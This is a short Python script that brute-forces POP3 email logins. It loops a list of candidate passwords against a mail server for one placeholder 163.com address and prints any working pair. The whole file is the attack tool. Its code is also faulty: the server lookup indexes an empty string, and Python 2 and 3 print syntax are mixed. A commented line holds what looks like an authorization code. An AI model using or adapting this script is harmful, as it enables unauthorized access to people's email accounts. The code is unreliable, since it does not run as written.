import poplib, string,json
def brute_tencent(serverName,user, pwd):
    PopServer = poplib.POP3(serverName)
    #print PopServer.getwelcome()
    PopServer.user(user)
    try:
        PopServer.pass_(pwd)
    except Exception as msg:
        print ""
    else:
        print("%s  %s" % (user, pwd))
        exit()

def get_emailType(email):
    email = email.split(".")
    email = email[0].split("@")
    serverName = ""
    with open('./serverNameConfig.json','r')as fp:
        json_data = json.load(fp)
        print('json',json_data)
    return serverName[email[1]]


mail = "xxx@163.com"
pwds = ["xx","xx","xx"]
#ejfjucqqjucvbegd
serverName = get_emailType(mail)
for pwd in pwds:
    brute_tencent(serverName,mail, pwd)